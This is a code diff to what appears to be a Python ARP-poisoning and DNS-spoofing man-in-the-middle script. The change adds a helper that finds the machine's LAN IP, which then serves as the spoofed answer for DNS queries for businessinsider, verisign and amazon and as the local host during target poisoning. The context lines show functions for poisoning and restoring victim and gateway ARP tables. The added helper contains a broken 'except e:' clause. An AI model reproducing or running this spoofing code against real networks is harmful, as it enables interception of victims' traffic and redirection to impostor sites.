@@ -56,6 +56,22 @@ def get_mac(IP):
     return rcv.sprintf(r"%Ether.src%")
 
 
+# Unfortutanetly, socket.gethostbyname(socket.gethostname()) isn't a cross-platform
+# way to get the LAN IP of the current machine. Following the suggestions at
+# https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib
+# this appears to work with minimal hassle
+def get_lan_ip():
+  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+  try:
+    s.connect(('10.255.255.255', 1))
+    ip = s.getsockname()[0]
+  except e:
+    ip = '127.0.0.1'
+  finally:
+    s.close()
+  return ip
+
+
 def reARP(gate_mac, victim_mac):
   print("[*] Restoring Targets...")
   send(ARP(op=2, pdst=victim_ip, psrc=gate_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gate_mac), count=7)
@@ -75,7 +91,8 @@ def blacklist(packet, spoofs):
       return True
   return False
 
-destIP = socket.gethostbyname(socket.gethostname()) #socket.gethostbyname('reddit.com')
+destIP = get_lan_ip()
+# socket.gethostbyname('reddit.com')
 def dns_spoof(dns_pkt):
   spoofed_sites = ['businessinsider'.encode(), 'verisign'.encode(), 'amazon'.encode()] # only spoof small set of websites
   ip = dns_pkt[IP]
@@ -155,7 +172,7 @@ def mitm():
 
   print("[*] Poisoning Targets...")
 
-  local_host = socket.gethostbyname(socket.gethostname())
+  local_host = get_lan_ip()
   while True:
     try:
       trick(gate_mac, victim_mac)
